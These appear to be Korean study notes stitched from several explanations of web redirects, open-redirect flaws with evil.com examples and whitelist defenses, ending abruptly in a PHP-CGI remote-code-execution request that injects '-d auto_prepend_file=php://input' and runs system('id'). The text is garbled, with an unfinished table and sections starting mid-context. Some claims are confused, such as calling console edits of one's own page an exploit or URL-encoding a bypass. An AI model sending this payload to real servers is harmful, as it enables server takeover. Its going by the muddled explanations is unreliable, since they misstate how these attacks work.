## 🔁 리다이렉트란

> **요청이나 처리를 원래 목적지 대신 다른 위치로 자동 전환하는 것**을 말합니다.

### 🌐 **웹에서의 리다이렉트 (HTTP Redirect)**

* 사용자가 어떤 URL에 접속했을 때,
  **자동으로 다른 URL로 이동시키는 것**.

#### 예시:

* 사용자가 `http://example.com`으로 접근했을 때,
  자동으로 `https://www.example.com/home`으로 이동.

<br>
<br>
<br>
한 페이지에서 **도메인이 다른 사이트로 이동**하는 것도 바로 리다이렉트(redirect)의 일종입니다. (외부 도메인으로의 리다이렉트)

### ✅ 도메인이 다른 사이트로 이동하는 리다이렉트란?

> 현재 페이지에서 사용자를 **전혀 다른 도메인 주소로 자동 이동시키는 것**

예를 들어:

* 사용자가 `http://example.com`에 접속했는데
* 브라우저가 자동으로 `https://another-site.com/login`으로 이동한다면
  → **이건 리다이렉트 + 도메인 변경**이 포함된 경우예요.


### 1. 🧠 HTML 메타 태그로 리다이렉트 (클라이언트 측) 

```html
<meta http-equiv="refresh" content="0; URL=https://another-site.com" />
```

* 페이지가 로드되자마자 (0초 후)
* 자동으로 다른 도메인으로 이동

---

### 2. 🧑‍💻 JavaScript를 통한 리다이렉트 

```javascript
window.location.href = "https://another-site.com";
```

또는

```javascript
location.replace("https://another-site.com");
```


---
### ✅ 리다이렉션 취약점이 되려면?

**사용자 입력**(예: `?next=` 파라미터 등)을 통해
**원하지 않는 외부 URL로 이동할 수 있어야** 합니다.

### 예시 (취약):

```js
// 사용자 입력에 따라 외부로 이동
const redirect = new URLSearchParams(window.location.search).get("next");
window.location.href = redirect;
```

* `https://example.com/login?next=https://evil.com`
  → 사용자 클릭 시 악성 사이트로 이동



| 상황                                   | 리다이렉션 취약점인가?      |
| ------------------------------------ | ----------------- |
| 콘솔에서 `href = "https://naver.com"` 입력 | ❌ 아님 – 브라우저 정상 기능 |
| 서버나                                  |                   |

---

## ✅ 1. **리다이렉션 URL을 콘솔에서 직접 변경하는 방법**

만약 `redirect` URL 파라미터를 통해 리디렉션이 이루어지는 경우라면, **콘솔에서 직접 URL 파라미터를 변경**하여 리디렉션 경로를 수정할 수 있습니다.

### 1.1 **URL 파라미터가 `window.location.search`로 처리되는 경우**

**예시 코드**:

```js
let redirectUrl = new URLSearchParams(window.location.search).get("redirect");
if (redirectUrl) {
    window.location.href = redirectUrl;
}
```

이 경우, **`redirect` 파라미터 값**을 **콘솔에서 수정**하면, 그 값으로 리디렉션됩니다.

### 1.2 **콘솔에서 리디렉션 URL 수정하기**

1. 브라우저에서 **F12**를 눌러 **개발자 도구**를 엽니다.
2. **Console** 탭을 선택합니다.
3. 아래 코드를 콘솔에 입력합니다:

```js
// 현재 URL에 파라미터를 추가해 리디렉션 URL을 변경
window.location.search = "?redirect=https://evil.com"; 
```

그럼, 페이지는 리디렉션이 되면서 **`https://evil.com`** 으로 이동하게 됩니다.

### 1.3 **콘솔에서 직접 window\.location.href 변경하기**

```js
window.location.href = "https://evil.com";
```

* 이 코드로 리디렉션 URL을 **직접 설정**할 수도 있습니다.
* 이 방법은 `redirect` 파라미터가 아닌 **직접적인 리디렉션을 유도**하는 방법입니다.

---

## ✅ 2. **Open Redirect 취약점 우회하기**

**Open Redirect 취약점**이 있다면 사용자가 특정 URL로 리디렉션될 때, 이를 악용하여 **악성 사이트로 우회**할 수 있습니다.

### 2.1 **Open Redirect 취약점이 있는 코드 예시**

```js
let redirectUrl = new URLSearchParams(window.location.search).get("redirect");
if (redirectUrl) {
    window.location.href = redirectUrl;
}
```

위와 같은 코드에서는 `?redirect=` 파라미터를 통해 리디렉션하는데, 공격자는 **악성 URL**을 파라미터로 전송할 수 있습니다.

### 2.2 **콘솔을 통해 리디렉션을 악용하는 방법**

1. 페이지 URL에서 `?redirect=...` 값을 수정하거나
2. **Console** 탭에서 `redirect` URL을 조작할 수 있습니다.

```js
// ?redirect 파라미터를 수정하여 리디렉션 URL을 변경
window.location.search = "?redirect=https://evil.com"; 
```

혹은:

```js
// 리디렉션 URL을 콘솔에서 직접 변경
window.location.href = "https://evil.com";
```

### 2.3 **파라미터 우회 시나리오 (URL 인코딩 우회)**

때로는 **URL 인코딩**을 통해 우회할 수 있습니다. 예를 들어:

```text
https://example.com/page?redirect=https://evil.com
```

이 URL을 **인코딩**하여 우회할 수 있습니다.

```text
https://example.com/page?redirect=https%3A%2F%2Fevil.com
```

위 URL은 \*\*`https://evil.com`\*\*으로 리디렉션되며, 파라미터를 우회할 수 있습니다.

---

## ✅ 3. **리다이렉션 URL을 변경하는 방어 방법**

1. **화이트리스트 기반 필터링**
   리디렉션 URL을 **화이트리스트**에 등록된 URL만 허용하도록 제한합니다.

```js
const allowedUrls = ["https://example.com", "https://trusted.com"];
let redirectUrl = new URLSearchParams(window.location.search).get("redirect");

if (allowedUrls.includes(redirectUrl)) {
    window.location.href = redirectUrl;
} else {
    console.log("Invalid redirect URL");
}
```

2. **현재 도메인 내 리디렉션만 허용**
   현재 도메인 내에서만 리디렉션이 가능하도록 제한할 수 있습니다.

```js
let redirectUrl = new URLSearchParams(window.location.search).get("redirect");
if (redirectUrl && redirectUrl.startsWith(window.location.origin)) {
    window.location.href = redirectUrl;
} else {
    console.log("Invalid redirect URL");
}
```

3. **JavaScript 필터링 및 인코딩**
   URL을 삽입하기 전에 **HTML 인코딩**을 통해 악성 스크립트가 삽입되는 것을 방지합니다.

---

## ✅ 4. **브라우저에서 다른 방식으로 리디렉션 우회하기**

리디렉션 URL을 **콘솔에서** 또는 **브라우저의 개발자 도구**를 통해 우회하고자 할 때, 반드시 아래 방법들을 사용할 수 있습니다:

* **페이지 로딩 중 URL 조작**: JavaScript를 통해 `window.location.href` 값을 **동적으로 수정**.
* **JavaScript 코드 삽입**: `eval()` 또는 `setTimeout()` 등을 사용한 공격 코드 삽입 가능.
* **URL 파라미터 우회**: URL을 인코딩하거나 파라미터 자체를 변형하여 우회 가능.

---

## 🧨 결론

* **리다이렉션 URL이 `window.location.search`로 설정된 경우**, 콘솔에서 파라미터를 변경하여 리디렉션을 악용할 수 있습니다.
* **Open Redirect** 취약점이 있다면, 악성 URL을 **파라미터로 주입**하여 다른 사이트로 우회시킬 수 있습니다.
* 보안을 강화하기 위해서는 **URL 검증** 및 **화이트리스트**를 사용하여 외부로의 리디렉션을 제한해야 합니다.

만약 **HTML 내에 `<script>` 태그** 형태로 리디렉션 URL이 기재되어 있고, 이 값이 JavaScript 코드 내에서 사용된다면, 콘솔에서 **이 값을 변경하는 방법**은 몇 가지가 있을 수 있습니다. 다만, **직접적으로 `<script>` 태그 내의 값을 수정하는 것**은 불가능할 수 있지만, **스크립트 변수**나 **DOM**에 있는 값을 수정하는 방법으로 우회할 수 있습니다.

### 예시 코드:

```html
<script>
  var redirectUrl = 'https://example.com';  // 리디렉션 URL
  window.location.href = redirectUrl;        // 리디렉션 수행
</script>
```

위와 같이 `<script>` 내에서 **리디렉션 URL**이 `var redirectUrl = 'https://example.com';`처럼 정의되어 있다면, 이 값은 JavaScript 변수에 저장되어 있으며, 콘솔에서 직접 **변수를 변경**할 수 있습니다.

---

## 🛠️ 1. **JavaScript 변수 값 변경 (콘솔에서 가능)**

리디렉션 URL이 `<script>` 태그 내의 JavaScript 변수에 저장되어 있다면, **콘솔에서 해당 변수를 수정**할 수 있습니다. 콘솔에서 다음과 같이 할 수 있습니다:

### 1.1 **`redirectUrl` 값 변경하기**

1. F12로 개발자 도구를 열고, **Console** 탭을 선택합니다.
2. 아래와 같이 변수 값을 수정합니다:

```js
// 현재 redirectUrl 변수 값을 덮어씁니다.
redirectUrl = 'https://evil.com';
```

3. 이렇게 하면, 해당 **`redirectUrl`** 변수의 값이 변경되고, 그 값을 사용하는 리다이렉션 코드가 실행됩니다. 즉, \*\*리디렉션이 `https://evil.com`\*\*으로 변경될 수 있습니다.

### 1.2 **리디렉션 URL 즉시 실행하기**

만약 스크립트 내에서 리디렉션이 바로 실행되었다면, 그 이후에도 `window.location.href` 값을 직접 변경해볼 수 있습니다:

```js
window.location.href = 'https://evil.com';
```

### 1.3 **값이 이미 리디렉션되었을 때 취소하기**

리디렉션이 이미 발생한 상태라면, **`window.location.href`** 값을 수정하여 리디렉션을 멈추거나 새로운 URL로 변경할 수 있습니다.

```js
window.location.href = 'https://evil.com'; // 리디렉션 URL을 강제로 수정
```

---

## 🧨 2. **DOM을 통한 우회**

만약 리디렉션 URL이 **`<script>`** 태그에 정의되어 있다면, 그 값은 **DOM**에 존재할 수 있습니다. 이를 **DOM에서 찾고 수정**할 수도 있습니다.

### 2.1 **DOM에서 리디렉션 URL 찾기**

```js
// 스크립트 태그 내에 정의된 redirectUrl 변수 값 찾기
document.querySelector('script').innerHTML
```

위 코드는 **첫 번째 `<script>` 태그 내의 내용**을 가져옵니다. 이 코드를 콘솔에서 실행하면 해당 스크립트의 코드 내용이 반환되므로, 그 안에 있는 **리디렉션 URL**을 확인할 수 있습니다.

### 2.2 **`script` 태그를 동적으로 수정하기**

```js
let script = document.querySelector('script');  // 첫 번째 script 태그 선택
script.innerHTML = "var redirectUrl = 'https://evil.com';";  // 리디렉션 URL을 악성 사이트로 변경
```

위 코드를 통해 `<script>` 태그를 직접 수정하여 리디렉션 URL을 악성 URL로 변경할 수 있습니다. 이후 페이지를 새로 고침하거나 해당 스크립트가 다시 실행되면, 악성 URL로 리디렉션됩니다.

---

## 🛡️ 3. **리다이렉션 우회 방어 방법**

리디렉션 URL을 콘솔에서 수정할 수 있다는 것은 **Open Redirect 취약점**이나 **XSS** 취약점이 존재할 가능성을 시사합니다. 이를 방지하려면:

### 3.1 **URL 화이트리스트 검증**

서버나 클라이언트 측에서 **리디렉션을 허용할 URL**을 제한해야 합니다. 예를 들어, **리디렉션 URL을 화이트리스트**에 포함된 도메인으로만 제한하여 **악성 사이트로의 리디렉션**을 방지할 수 있습니다.

```js
const allowedUrls = ['https://trusted.com', 'https://example.com'];

let redirectUrl = new URLSearchParams(window.location.search).get('redirect');

if (allowedUrls.includes(redirectUrl)) {
    window.location.href = redirectUrl;
} else {
    console.log('Invalid redirect URL');
}
```

### 3.2 **JavaScript에서 URL 검증**

리디렉션을 수행하기 전에 URL이 **현재 도메인**에 속하는지 확인하는 방법입니다.

```js
let redirectUrl = new URLSearchParams(window.location.search).get('redirect');
if (redirectUrl && redirectUrl.startsWith(window.location.origin)) {
    window.location.href = redirectUrl;
} else {
    console.log('Invalid redirect URL');
}
```

### 3.3 **인코딩/디코딩 문제 처리**

URL에 인코딩된 값이나 JavaScript 코드가 포함되면 이를 **정확히 디코딩하여 처리**하는 것이 필요합니다. 공격자가 **인코딩된 URL**을 삽입할 수 있기 때문입니다.

이 요청은 명백한 **PHP 설정 우회 + 원격 코드 실행(RCE)** 공격 시도입니다.
공격자가 웹 서버에 **악성 PHP 코드**를 삽입하고 실행하려는 목적으로 설계된 요청입니다.

---

## 🧨 예시

```
POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
```

### 🔍 디코딩하면:

```
POST /hello.world?-d allow_url_include=1 -d auto_prepend_file=php://input
```

> `%AD`는 실제로는 **하이픈(-)** 의 잘못된 인코딩 (`-d`), `%3d`는 `=`를 의미합니다.

---

## 🧠 무슨 뜻인가요?

이 요청은 PHP 인터프리터에게 다음을 강제로 전달하려는 시도입니다:

| 파라미터                               | 설명                               |
| ---------------------------------- | -------------------------------- |
| `-d allow_url_include=1`           | PHP 설정을 동적으로 바꿔서 외부 URL 포함 허용    |
| `-d auto_prepend_file=php://input` | 요청 본문에 포함된 코드를 PHP 파일처럼 실행하겠다는 뜻 |

즉:

### ▶ 공격자가 하고 싶은 것:

* **PHP 설정을 강제로 우회해서**
* **POST 요청 본문에 PHP 코드를 넣고**
* **그걸 실행하도록 만듦**

---

## 🔥 예: 실제 공격 흐름

```http
POST /hello.world?-d allow_url_include=1 -d auto_prepend_file=php://input HTTP/1.1
Content-Type: text/plain

<?php system('id'); ?>
```

➡️ 이 요청이 성공하면, **`id` 명령이 서버에서 실행되고**, 결과가 응답으로 돌아옵니다.
결국 공격자는 원격에서 시스템 명령을 자유롭게 실행할 수 있게 됩니다.

---

## 🧨 전형적인 PHP CGI 취약점 공격

이건 **CVE-2012-1823**라는 취약점을 기반으로 한 **PHP-CGI 명령어 인젝션** 공격입니다.

### 📌 관련 정보:

| 항목      | 내용                                                    |
| ------- | ----------------------------------------------------- |
| 취약점     | **CVE-2012-1823**                                     |
| 영향받는 환경 | PHP가 CGI 모드로 동작하며, 웹서버가 `query string`을 해석하지 않고 넘길 경우 |
| 결과      | 공격자가 임의 PHP 설정 추가 (`-d`), 코드 실행 가능 (`php://input`)    |
| 피해      | 완전한 서버 탈취 가능 (웹쉘 업로드 등)                               |

---

## 🧨 결론

* **콘솔에서 `redirectUrl`을 변경할 수 있습니다.** 리디렉션 URL을 **JavaScript 변수**로 처리할 경우, 콘솔에서 직접 값을 수정하여 **리디렉션을 우회**할 수 있습니다.
* 리디렉션 URL을 **HTML `<script>` 내에서 처리**하는 경우에도 **DOM을 조작**하여 이를 변경할 수 있습니다.



